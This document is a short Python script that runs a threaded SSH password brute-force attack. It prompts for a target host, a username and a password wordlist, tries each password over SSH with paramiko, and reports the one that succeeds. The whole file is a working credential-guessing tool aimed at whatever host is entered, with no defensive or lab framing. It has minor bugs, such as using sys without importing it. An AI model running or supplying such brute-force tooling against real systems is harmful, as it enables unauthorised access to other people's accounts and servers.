import paramiko, socket, os
from termcolor import colored
import time, threading

stop_flag = 0

def ssh_connect(password, code=0):
	global stop_flag
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	try:
		ssh.connect(host, port=22, username=username, password=password)
		stop_flag = 1
		print(colored(f"[+] Found password, for the account {username} as: {password}",'green'))
	except:
		print(colored("[-] Invalid password.",'red'))
	ssh.close()


if __name__ == "__main__":
	host = input("[+] Target address: ")
	username = input("[+] SSH username: ")
	input_file = input("[+] Password file: ")
	print("\n")

	if os.path.exists(input_file) == False:
		print(f" Please provide a valid path/file")
		sys.exit(1)

	print(f"* * * Starting threaded SSH bruteforce on {host} for the account: {username} * * *")

	with open(input_file, "r") as file:
		for line in file.readlines():
			if stop_flag == 1:
				t.join()
				exit()
			password = line.strip()
			t = threading.Thread(target = ssh_connect, args=(password,))
			t.start()
			time.sleep(0.5)

